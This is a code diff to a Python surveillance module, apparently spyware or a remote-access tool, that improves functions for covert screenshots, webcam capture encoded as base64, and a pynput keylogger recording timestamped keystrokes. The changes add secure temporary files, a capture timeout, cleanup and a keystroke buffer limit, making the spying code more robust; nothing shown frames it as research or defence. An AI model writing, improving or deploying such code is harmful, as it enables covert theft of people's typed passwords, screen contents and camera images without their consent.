@@ -1,6 +1,7 @@
 import os
 import base64
 import logging
+import tempfile
 from datetime import datetime
 import pyautogui
 import cv2
@@ -10,6 +11,7 @@ from pynput import keyboard
 keylogger_running = False
 keylogger_listener = None
 captured_keys = []
+MAX_KEYLOG_BUFFER = 1000  # Maximum number of keystrokes to store
 
 def take_screenshot():
     """Take a screenshot of the current screen"""
@@ -17,9 +19,10 @@ def take_screenshot():
         # Take screenshot
         screenshot = pyautogui.screenshot()
         
-        # Save to temp file
-        temp_path = "temp_screenshot.png"
-        screenshot.save(temp_path)
+        # Create secure temp file
+        with tempfile.NamedTemporaryFile(suffix='.png', delete=False) as temp_file:
+            temp_path = temp_file.name
+            screenshot.save(temp_path)
         
         # Read and encode as base64
         with open(temp_path, "rb") as f:
@@ -28,6 +31,7 @@ def take_screenshot():
         # Clean up temp file
         os.remove(temp_path)
         
+        logging.info("Screenshot captured successfully")
         return {
             'status': 'success',
             'timestamp': datetime.now().isoformat(),
@@ -42,8 +46,8 @@ def take_screenshot():
             'timestamp': datetime.now().isoformat()
         }
 
-def capture_webcam():
-    """Capture an image from the webcam"""
+def capture_webcam(timeout=5):
+    """Capture an image from the webcam with timeout"""
     try:
         # Initialize webcam
         cap = cv2.VideoCapture(0)
@@ -53,19 +57,29 @@ def capture_webcam():
                 'error': 'No webcam found',
                 'timestamp': datetime.now().isoformat()
             }
-            
-        # Capture frame
-        ret, frame = cap.read()
+        
+        # Set timeout property
+        cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
+        
+        # Try to capture frame with timeout
+        start_time = datetime.now()
+        while (datetime.now() - start_time).seconds < timeout:
+            ret, frame = cap.read()
+            if ret:
+                break
+        
         if not ret:
+            cap.release()
             return {
                 'status': 'error',
-                'error': 'Failed to capture image',
+                'error': f'Failed to capture image within {timeout} seconds',
                 'timestamp': datetime.now().isoformat()
             }
-            
-        # Save to temp file
-        temp_path = "temp_webcam.jpg"
-        cv2.imwrite(temp_path, frame)
+        
+        # Create secure temp file
+        with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as temp_file:
+            temp_path = temp_file.name
+            cv2.imwrite(temp_path, frame)
         
         # Read and encode as base64
         with open(temp_path, "rb") as f:
@@ -75,6 +89,7 @@ def capture_webcam():
         cap.release()
         os.remove(temp_path)
         
+        logging.info("Webcam image captured successfully")
         return {
             'status': 'success',
             'timestamp': datetime.now().isoformat(),
@@ -82,6 +97,8 @@ def capture_webcam():
             'format': 'jpg'
         }
     except Exception as e:
+        if 'cap' in locals():
+            cap.release()
         logging.error(f"Error capturing webcam: {str(e)}")
         return {
             'status': 'error',
@@ -91,14 +108,20 @@ def capture_webcam():
 
 def on_key_press(key):
     """Callback for key press events"""
+    global captured_keys
     try:
         key_str = str(key.char)
     except AttributeError:
         key_str = str(key)
+    
     captured_keys.append({
         'key': key_str,
         'timestamp': datetime.now().isoformat()
     })
+    
+    # Limit buffer size
+    if len(captured_keys) > MAX_KEYLOG_BUFFER:
+        captured_keys = captured_keys[-MAX_KEYLOG_BUFFER:]
 
 def start_keylogger():
     """Start the keylogger"""
